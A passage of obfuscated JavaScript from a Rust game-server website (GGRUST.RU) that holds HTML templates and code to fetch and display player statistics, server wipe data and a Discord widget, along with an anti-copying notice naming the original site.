'Ошибка\x20при\x20загрузке\x20данных', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-capsules\x20profile-icon\x22></i>Суицидов</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'type', 'moscow_stats', 'close', 'isAppReady', 'custom-tableContainer', 'span', 'Ошибка\x20при\x20запросе\x20к\x20API:', 'ammo.rocket.fire', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-bone\x20profile-icon\x22></i>Волков\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'instant_invite', 'cloth', '<section\x20class=\x22flex\x20items-center\x20h-full\x20sm:p-16\x20dark:bg-gray-900\x20dark:text-gray-100\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x20flex\x20flex-col\x20items-center\x20justify-center\x20px-5\x20mx-auto\x20my-8\x20space-y-8\x20text-center\x20sm:max-w-md\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text-3xl\x22>Ошибка!\x20Сайт\x20использует\x20краденный\x20код,\x20данный\x20код\x20был\x20написан\x20для\x20GGRUST.RU</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20rel=\x22noopener\x20noreferrer\x22\x20href=\x22https://t.me/DeZeR2\x22\x20class=\x22px-8\x20py-3\x20font-semibold\x20rounded\x20dark:bg-violet-400\x20dark:text-gray-900\x22>Заказать\x20оформление</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</section>', 'https://stats.ggrust.ru/stats-profile.php?steamId=', 'BarrelsDestroyed', 'DataTable', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Кукурузы</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/corn.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'PROFILE_INFO', 'SHOP', 'datetimeglobalwipe', '.Product-module__img,\x20.Categories-module__category,\x20.MonitoringServer-module__progressBarWrapper,\x20.Servers-module__server,\x20.HeaderNav-module__link,\x20button,\x20.menuWidjet', 'globalwipeinfo', 'corn', 'setRequestHeader', '29498aHQTQF', 'dataTable', 'tagName', 'parse', 'PlayedForWipe', 'json', '8774514yQlVpT', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Серы</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/sulfur.ore.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'BALANCE_MODAL', '(?:^|;\x20)', 'https://rustaria.ru/servertop_v2.php?server=', 'rose', 'Ошибка\x20при\x20получении\x20данных:', 'fixed', '</span>', 'ammo.rifle.explosive', 'orchid', '\x20-\x20Статистика\x20игрока', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-bone\x20profile-icon\x22></i>МВК\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'New\x20discord\x20invite\x20is\x20', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</section>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<section\x20data-v-22378e5b=\x22\x22\x20class=\x22hits\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22player-view\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hover-text\x22><i\x20data-v-22378e5b=\x22\x22\x20class=\x22fa-solid\x20fa-circle-info\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20style=\x22align-items:\x20center;\x22></i>\x20НАВЕДИТЕ\x20КУРСОР\x20ДЛЯ\x20ПОДСЧЕТА\x20ПОПАДАНИЙ\x20</h1><img\x20data-v-22378e5b=\x22\x22\x20class=\x22player-model\x22\x20alt=\x22\x22\x20src=\x22https://rustaria.ru/img/player1.png\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hits-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount\x20head\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-part\x22>Голова</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20data-v-22378e5b=\x22\x22\x20class=\x22hitcount-result\x22>', 'alltime', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Орхидей</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://rustexplore.com/images/130/orchid.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'Не\x20удалось\x20скопировать\x20промокод.', 'innerText', 'statusText', 'toString', 'justifyContent', 'table_image.png', 'Произошла\x20ошибка\x20при\x20получении\x20данных:', '<button\x20class=\x22btn-details\x22\x20data-steamid=\x22', '6734ZStyeH', 'target', 'place-3', 'ontextmenu', 'RightFootHits', 'InfoWipe', 'chickens', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22form-control\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22sections-container\x22\x20style=\x22display:\x20flex;\x20justify-content:\x20space-between;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<section\x20data-v-22378e5b=\x22\x22\x20class=\x22kills\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-header\x22>Убито</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-egg\x20profile-icon\x22></i>Куриц\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', '</div>', 'top_resources', '\x22>+500₽</div>', 'send', 'playedTime', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-car-burst\x20profile-icon\x22></i>Танков</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'TotalExplosivePoints', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Медведей</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/bear.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'rightleg', 'wheat', 'ggrust.gamestores.io', 'match', 'pdf', 'https://discordapp.com/api/guilds/', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-bomb\x20profile-icon\x22></i>Сачелей\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'toastSound', '.MonitoringWidget-module__updateBtn', 'Ошибка\x20при\x20загрузке\x20скрипта:', '755511116762710036', 'then', 'Widget\x20element\x20not\x20found\x20', 'discord-guild-online', '.statsBtnProfile', '?with_counts=true', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</section>\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20<section\x20class=\x22stats\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22profile-data-header\x22>Статистика</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-container\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22\x20>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'blue.berry', 'leftleg', '100%', 'replace', 'BuildingsPlaced', 'players', 'input[name=\x22timeframeTop\x22]', 'allplayer', 'BanDate', 'ExpireDate', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Подсолнечников</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://rustexplore.com/images/130/sunflower.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x0a\x0a\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x20\x20\x20\x20<section\x20class=\x22gather\x22>\x0a\x20\x20\x20\x20<h1\x20class=\x22profile-data-header\x22>Статистика\x20рейдера\x20<span\x20style=\x22color:\x20green;\x22>(Очков\x20всего:\x20'];
    _0x20f0 = function() {
        return _0x38a435;
    }
    ;
    return _0x20f0();
}
async function fetchDataAndRender() {
    const _0x7c3d80 = _0x31dfac;
    try {
        const _0x408e42 = await fetch(_0x7c3d80(0x202))
          , _0x2441cf = await _0x408e42[_0x7c3d80(0x129)]()
          , _0x50e37b = document[_0x7c3d80(0x1a9)](_0x7c3d80(0x1ef));
        _0x50e37b['role'] = 'presentation',
        _0x50e37b[_0x7c3d80(0x277)] = () => {
            const _0xf987e0 = _0x7c3d80;
            document[_0xf987e0(0x1d5)](_0xf987e0(0x212))[_0xf987e0(0x174)][_0xf987e0(0x244)](_0xf987e0(0x268));
        }
        ,
        _0x50e37b['id'] = _0x7c3d80(0x1c0),
        _0x50e37b[_0x7c3d80(0x217)] = _0x7c3d80(0x2ae),
        _0x50e37b[_0x7c3d80(0x1aa)] = _0x7c3d80(0xf4),
        updateDomWithData(_0x2441cf, _0x50e37b),
        document[_0x7c3d80(0x21b)]['appendChild'](_0x50e37b);
    } catch (_0x2e69a6) {
        console[_0x7c3d80(0x18c)](_0x7c3d80(0x113), _0x2e69a6);
    }
}
function updateDomWithData(_0x4c521f, _0x4c3d20) {
    const _0xe54ff4 = _0x31dfac
      , _0x3af127 = _0x4c3d20[_0xe54ff4(0x1d5)]('.wheenwipe');
    _0x3af127[_0xe54ff4(0x1aa)] = '';
    const _0x98facb = document[_0xe54ff4(0x1a9)]('div');
    _0x98facb[_0xe54ff4(0x217)] = _0xe54ff4(0x121);
    const _0x57f257 = document[_0xe54ff4(0x1a9)](_0xe54ff4(0x1ef));
    _0x57f257[_0xe54ff4(0x217)] = _0xe54ff4(0x148),
    _0x4c521f[_0xe54ff4(0x1bf)]( (_0x480349, _0x5e12a5) => {
        const _0x597aa5 = _0xe54ff4
          , _0x514ac6 = document[_0x597aa5(0x1a9)]('div');
        _0x514ac6[_0x597aa5(0x217)] = _0x597aa5(0x107);
        const _0x46a356 = document['createElement'](_0x597aa5(0x1ef));
        _0x46a356['className'] = _0x597aa5(0x2cd),
        _0x46a356[_0x597aa5(0x1b2)] = _0x480349['server'];
        const _0x2a8d1f = document[_0x597aa5(0x1a9)](_0x597aa5(0x1ef));
        _0x2a8d1f['className'] = _0x5e12a5 === _0x4c521f[_0x597aa5(0x26d)] - 0x1 ? _0x597aa5(0x11f) : _0x597aa5(0x1e3),
        _0x2a8d1f[_0x597aa5(0x1aa)] = _0x480349[_0x597aa5(0x227)] + _0x597aa5(0x263);
        const _0x39cf8e = document[_0x597aa5(0x1a9)](_0x597aa5(0x112));
        _0x39cf8e[_0x597aa5(0x1b2)] = _0x480349[_0x597aa5(0x2b4)],
        _0x39cf8e[_0x597aa5(0x217)] = _0x597aa5(0x280),
        _0x2a8d1f[_0x597aa5(0x219)](_0x39cf8e),
